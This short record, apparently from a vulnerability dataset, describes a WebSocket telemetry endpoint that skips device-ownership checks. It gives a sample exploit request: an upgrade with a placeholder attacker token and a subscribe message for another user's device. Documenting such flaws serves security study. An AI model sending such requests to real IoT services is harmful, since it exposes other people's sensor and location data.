diagnosis: The WebSocket endpoint accepts subscriptions for real-time device telemetry frames over an established socket without checking whether the authenticated user owns or has access permissions to the requested device_id. An attacker can listen to live sensor streams, location coordinates, and operational telemetry from unauthorized IoT hardware.
exploit_request:
GET /ws/telemetry HTTP/1.1
Host: api.example.com
Upgrade: websocket
Connection: Upgrade
Authorization: Bearer <attacker_jwt>

{"type": "subscribe", "device_id": "sensor-gh-8821"}
